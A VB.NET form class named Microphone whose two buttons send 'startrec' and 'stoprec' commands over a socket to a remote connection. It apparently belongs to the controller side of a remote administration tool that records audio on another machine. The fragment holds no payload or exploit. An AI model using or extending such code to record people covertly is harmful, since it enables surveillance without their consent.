Public Class Microphone
    Public sock As Integer
    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Button1.Enabled = True
        Form1.S.Send(sock, "stoprec")
        Button2.Enabled = False
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Button1.Enabled = False
        Form1.S.Send(sock, "startrec")
        Button2.Enabled = True
    End Sub
End Class